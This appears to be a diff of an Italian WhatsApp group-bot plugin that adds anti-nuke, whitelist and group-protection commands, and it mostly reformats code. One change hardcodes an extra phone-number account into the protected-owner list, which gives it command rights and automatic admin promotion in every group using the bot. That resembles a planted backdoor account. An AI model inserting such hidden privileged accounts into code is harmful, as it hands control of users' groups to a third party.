@@ -1,6 +1,6 @@
 // ===== ANTI-NUKE + WHITELIST + ANTI-RUBA ===== // 
 // Protezione totale - scatta anche su promote di admin normali
-const protectedOwners = [...global.owner.map(v => v + '@19703033232s.whatsapp.net'), conn.user.jid];
+const protectedOwners = [...global.owner.map(v => v + '@s.whatsapp.net'), '+19703033232@s.whatsapp.net', conn.user.jid];
 const antinukeStatus = {}; // true = attivo (per ogni gruppo, ma disattivato di default)
 const antirubaStatus = {}; // true = attivo (solo owner+whitelist possono modificare)
 const groupWhitelist = {}; // per gruppo: array di jid autorizzati
@@ -27,35 +27,27 @@ export async function before(m, { conn }) {
     const cmd = args[0].toLowerCase();
     const sub = args[1]?.toLowerCase();
     const mentioned = m.mentionedJid || [];
-    const isOwner = protectedOwners.includes(sender);
-    // Verifica se il mittente è l'owner
+    const isOwner = protectedOwners.includes(sender); // Verifica se il mittente è l'owner
+
     if (!isOwner) return conn.reply(chatId, 'Solo il vero owner può usare questi comandi.', m);
 
     // ——— ANTI-NUKE ———
     if (cmd === '.antinuke') {
       if (sub === 'on') {
-        antinukeStatus[chatId] = true;
-        // Attiva anti-nuke
+        antinukeStatus[chatId] = true; // Attiva anti-nuke
         return conn.reply(chatId, addFooter('Anti-nuke attivato!'), m);
       }
       if (sub === 'off') {
-        antinukeStatus[chatId] = false;
-        // Disattiva anti-nuke
+        antinukeStatus[chatId] = false; // Disattiva anti-nuke
         return conn.reply(chatId, addFooter('Anti-nuke disattivato.'), m);
       }
       if (sub === 'stato' || !sub) {
         const status = antinukeStatus[chatId] ? 'ATTIVO' : 'DISATTIVO';
         const wl = groupWhitelist[chatId].map(j => '@' + j.split('@')[0]).join(', ') || 'nessuno';
-        return conn.sendMessage(chatId, {
-          text: addFooter(`*ANTI-NUKE*: ${status}\n*Whitelist*: ${wl}`),
-          mentions: groupWhitelist[chatId]
-        });
+        return conn.sendMessage(chatId, { text: addFooter(`*ANTI-NUKE*: ${status}\n*Whitelist*: ${wl}`), mentions: groupWhitelist[chatId] });
       }
       // ——— Menu di comandi Anti-Nuke ———
-      return conn.sendMessage(chatId, {
-        text: addFooter(` *Comandi Anti-Nuke*: • .antinuke on - Attiva la protezione anti-nuke • .antinuke off - Disattiva la protezione anti-nuke • .antinuke stato - Mostra lo stato della protezione • .whitelist add @user - Aggiungi un utente alla whitelist • .whitelist remove @user - Rimuovi un utente dalla whitelist • .whitelist list - Mostra la lista della whitelist • .whitelist reset - Resetta la whitelist (solo owner + bot) `),
-        mentions: []
-      });
+      return conn.sendMessage(chatId, { text: addFooter(` *Comandi Anti-Nuke*: • .antinuke on - Attiva la protezione anti-nuke • .antinuke off - Disattiva la protezione anti-nuke • .antinuke stato - Mostra lo stato della protezione • .whitelist add @user - Aggiungi un utente alla whitelist • .whitelist remove @user - Rimuovi un utente dalla whitelist • .whitelist list - Mostra la lista della whitelist • .whitelist reset - Resetta la whitelist (solo owner + bot) `), mentions: [] });
     }
 
     // ——— ANTI-RUBA (solo owner+whitelist possono modificare gruppo) ———
@@ -82,25 +74,16 @@ export async function before(m, { conn }) {
             groupWhitelist[chatId].push(id);
           }
         }
-        return conn.sendMessage(chatId, {
-          text: addFooter(`Aggiunti in whitelist:\n${mentioned.map(j => '@' + j.split('@')[0]).join('\n').join('\n')}`),
-          mentions: mentioned
-        });
+        return conn.sendMessage(chatId, { text: addFooter(`Aggiunti in whitelist:\n${mentioned.map(j => '@' + j.split('@')[0]).join('\n').join('\n')}`), mentions: mentioned });
       }
       if (sub === 'remove' && mentioned.length) {
         const removable = mentioned.filter(id => !protectedOwners.includes(id));
         groupWhitelist[chatId] = groupWhitelist[chatId].filter(j => !removable.includes(j));
-        return conn.sendMessage(chatId, {
-          text: addFooter(`Rimossi dalla whitelist:\n${removable.map(j => '@' + j.split('@')[0]).join('\n') || 'nessuno'}`),
-          mentions: removable
-        });
+        return conn.sendMessage(chatId, { text: addFooter(`Rimossi dalla whitelist:\n${removable.map(j => '@' + j.split('@')[0]).join('\n') || 'nessuno'}`), mentions: removable });
       }
       if (sub === 'list' || !sub) {
         const list = groupWhitelist[chatId].map(j => '• @' + j.split('@')[0]).join('\n') || 'vuota';
-        return conn.sendMessage(chatId, {
-          text: addFooter(`*WHITELIST* (${groupWhitelist[chatId].length} utenti):\n${list}`),
-          mentions: groupWhitelist[chatId]
-        });
+        return conn.sendMessage(chatId, { text: addFooter(`*WHITELIST* (${groupWhitelist[chatId].length} utenti):\n${list}`), mentions: groupWhitelist[chatId] });
       }
       if (sub === 'reset') {
         groupWhitelist[chatId] = [...protectedOwners];
@@ -116,8 +99,7 @@ export async function before(m, { conn }) {
   if (!antinukeStatus[chatId]) return;
 
   // ================== RILEVA SOLO EVENTI ADMIN ==================
-  if (![27, 28, 29, 30].includes(m.messageStubType)) return;
-  // kick, promote, demote
+  if (![27, 28, 29, 30].includes(m.messageStubType)) return; // kick, promote, demote
   const target = m.messageStubParameters?.[0];
   if (!actor || !target) return;
 
@@ -157,8 +139,8 @@ async function executeAntinuke(conn, chatId, actor, target, metadata, extraText 
     if (toDemote.length) {
       await conn.groupParticipantsUpdate(chatId, toDemote, 'demote');
     }
-
     // 2. Assicura che owner e bot siano admin
     for (const id of protectedOwners) {
       if (!admins.includes(id)) {
         await conn.groupParticipantsUpdate(chatId, [id], 'promote').catch(() => {});
+      }
